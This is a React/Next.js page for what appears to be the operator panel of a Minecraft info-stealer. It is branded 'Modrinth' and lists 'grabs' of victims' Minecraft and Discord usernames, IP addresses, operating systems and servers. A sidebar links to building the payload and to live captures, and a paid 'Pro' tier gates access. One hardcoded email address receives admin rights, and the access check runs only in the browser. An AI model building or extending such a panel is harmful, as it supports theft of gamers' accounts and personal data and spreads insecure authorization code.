'use client';

import { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';

const colors = {
  bg: '#0a0a0f',
  panel: '#111218',
  border: '#1e1f28',
  text: '#ffffff',
  textDim: '#6b6e7b',
  green: '#22c55e',
};

function NavItem({ icon, label, active, onClick }) {
  return (
    <div onClick={onClick} style={{
      display: 'flex', alignItems: 'center', gap: 10, padding: '9px 14px', borderRadius: 8,
      background: active ? '#1a1b24' : 'transparent',
      color: active ? colors.text : colors.textDim, fontSize: 14, cursor: 'pointer', marginBottom: 2,
    }}>
      <span style={{ fontSize: 16, width: 20, textAlign: 'center' }}>{icon}</span>
      <span>{label}</span>
    </div>
  );
}

export default function GrabsPage() {
  const router = useRouter();
  const [grabs, setGrabs] = useState([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState('');
  const [userEmail, setUserEmail] = useState('');
  const [isPro, setIsPro] = useState(false);
  const [proChecked, setProChecked] = useState(false);
  const [, setTick] = useState(0);

  useEffect(() => {
    const interval = setInterval(() => setTick(t => t + 1), 10000);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    fetch('/api/auth/user')
      .then(r => r.json())
      .then(d => {
        if (d.user?.email) {
          setUserEmail(d.user.email);
          if (d.user.email === 'lifegrading@gmail.com') {
            setIsPro(true);
            setProChecked(true);
            const url = '/api/grabs';
            return fetch(url);
          } else {
            fetch('/api/user/pro')
              .then(r => r.json())
              .then(p => { setIsPro(p.is_pro); setProChecked(true); })
              .catch(() => { setIsPro(false); setProChecked(true); });
            const url = `/api/grabs?owner_email=${encodeURIComponent(d.user.email)}`;
            return fetch(url);
          }
        }
        setLoading(false);
        return null;
      })
      .then(r => r ? r.json() : null)
      .then(d => { if (d) setGrabs(d.grabs || []); setLoading(false); })
      .catch(() => setLoading(false));
  }, []);

  const formatTime = (created, updated) => {
    const ref = updated || created;
    if (!ref) return '';
    const d = new Date(ref);
    const now = new Date();
    const diff = Math.floor((now - d) / 1000);
    if (diff < 5) return 'Just now';
    if (diff < 60) return `${diff}s ago`;
    if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
    if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
    if (diff < 604800) return `${Math.floor(diff / 86400)}d ago`;
    return d.toLocaleDateString();
  };

  const filtered = grabs.filter(g => {
    const q = search.toLowerCase();
    return (
      g.minecraft_username?.toLowerCase().includes(q) ||
      g.discord_username?.toLowerCase().includes(q) ||
      g.ip_address?.toLowerCase().includes(q)
    );
  });

  if (!proChecked) {
    return (
      <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
        <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>Loading...</div>
      </div>
    );
  }

  if (!isPro && userEmail !== 'lifegrading@gmail.com') {
    return (
      <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
        <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', flexDirection: 'column', gap: 16 }}>
          <div style={{ fontSize: 48 }}>🔒</div>
          <div style={{ fontSize: 18, fontWeight: 600 }}>Pro Required</div>
          <div style={{ fontSize: 14, color: colors.textDim }}>You need a Pro license to access Grabs.</div>
          <div onClick={() => router.push('/dashboard')} style={{ cursor: 'pointer', color: '#3b82f6', fontSize: 14, marginTop: 8 }}>← Back to Dashboard</div>
        </div>
      </div>
    );
  }

  return (
    <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
      <aside style={{ width: 200, borderRight: `1px solid ${colors.border}`, padding: '20px 12px', display: 'flex', flexDirection: 'column' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '0 10px', marginBottom: 28 }}>
          <div style={{ width: 28, height: 28, borderRadius: 6, background: '#222' }} />
          <span style={{ fontSize: 14, fontWeight: 600 }}>Modrinth</span>
        </div>
        <div style={{ flex: 1 }}>
          <NavItem icon="📊" label="Dashboard" onClick={() => router.push('/dashboard')} />
          <NavItem icon="⚡" label="Grabs" active onClick={() => {}} />
          <NavItem icon="🔨" label="Build" onClick={() => router.push('/dashboard/build')} />
          {userEmail === 'lifegrading@gmail.com' && (
            <NavItem icon="👥" label="Admin" onClick={() => router.push('/admin')} />
          )}
          <NavItem icon="📋" label="Plans" onClick={() => router.push('/dashboard')} />
          <NavItem icon="⭐" label="+Rep" onClick={() => router.push('/dashboard')} />
          <NavItem icon="📡" label="Live Captures" onClick={() => router.push('/dashboard')} />
        </div>
        <div>
          <NavItem icon="⚙️" label="Settings" onClick={() => router.push('/dashboard/settings')} />
          <NavItem icon="🚪" label="Log out" onClick={() => window.location.href = '/api/auth/logout'} />
        </div>
      </aside>
      <div style={{ flex: 1, padding: '28px 36px', overflowY: 'auto' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 12, marginBottom: 20 }}>
          <span style={{ fontSize: 24, fontWeight: 700 }}>Grabs</span>
          <span style={{ color: colors.textDim, fontSize: 14 }}>{grabs.length} captured</span>
        </div>
        <div style={{ marginBottom: 20, display: 'flex', justifyContent: 'flex-end' }}>
          <input
            value={search}
            onChange={e => setSearch(e.target.value)}
            placeholder="Search..."
            style={{ background: colors.panel, border: `1px solid ${colors.border}`, borderRadius: 8, padding: '8px 14px', color: colors.text, fontSize: 13, outline: 'none', width: 220 }}
          />
        </div>
        <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
          {filtered.map((g) => {
            const isUpdated = g.updated_at && g.updated_at !== g.created_at;
            return (
              <div
                key={g.id}
                onClick={() => router.push(`/dashboard/grabs/${g.id}`)}
                style={{ background: colors.panel, border: `1px solid ${colors.border}`, borderRadius: 12, padding: '16px 20px', display: 'flex', alignItems: 'center', gap: 14, cursor: 'pointer', transition: 'all 0.15s ease' }}
                onMouseEnter={e => { e.currentTarget.style.borderColor = '#333'; e.currentTarget.style.background = '#15161e'; }}
                onMouseLeave={e => { e.currentTarget.style.borderColor = colors.border; e.currentTarget.style.background = colors.panel; }}
              >
                <div style={{ width: 42, height: 42, borderRadius: 10, background: '#1a1b24', display: 'flex', alignItems: 'center', justifyContent: 'center', overflow: 'hidden' }}>
                  <img src={`https://mc-heads.net/avatar/${g.minecraft_username}/42`} alt="" style={{ width: 42, height: 42 }} onError={e => { e.target.style.display = 'none'; }} />
                </div>
                <div style={{ flex: 1, minWidth: 0 }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                    <span style={{ fontSize: 14, fontWeight: 600, color: colors.text }}>{g.minecraft_username}</span>
                    {isUpdated && (
                      <span style={{ background: '#2a1a0a', color: '#f59e0b', fontSize: 9, padding: '2px 6px', borderRadius: 4, fontWeight: 700, textTransform: 'uppercase', letterSpacing: 0.5 }}>*Updated</span>
                    )}
                    <span style={{ background: '#1a2a2a', color: '#5eead4', fontSize: 10, padding: '2px 7px', borderRadius: 4, fontWeight: 600, whiteSpace: 'nowrap' }}>
                      {g.os?.includes('Windows') ? 'Windows' : g.os?.includes('Mac') ? 'macOS' : g.os?.includes('Linux') ? 'Linux' : g.os || 'Unknown'}
                    </span>
                  </div>
                  <div style={{ fontSize: 12, color: colors.textDim, marginTop: 2, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{g.discord_username}</div>
                </div>
                <div style={{ display: 'flex', alignItems: 'center', gap: 14, flexShrink: 0 }}>
                  {g.servers && (
                    <span style={{ fontSize: 12, color: colors.textDim, display: 'flex', alignItems: 'center', gap: 4 }}>
                      🌐 {g.servers.split(',').filter(Boolean).length}
                    </span>
                  )}
                  <span style={{ fontSize: 12, color: isUpdated ? '#f59e0b' : colors.textDim, whiteSpace: 'nowrap', fontWeight: isUpdated ? 600 : 400 }}>{formatTime(g.created_at, g.updated_at)}</span>
                  <span style={{ color: '#444', fontSize: 14 }}>›</span>
                </div>
              </div>
            );
          })}
          {filtered.length === 0 && !loading && (
            <div style={{ textAlign: 'center', color: colors.textDim, fontSize: 13, padding: 60 }}>
              <div style={{ fontSize: 28, marginBottom: 8 }}>📭</div>
              {grabs.length === 0 ? 'No grabs yet' : 'No grabs match your search'}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
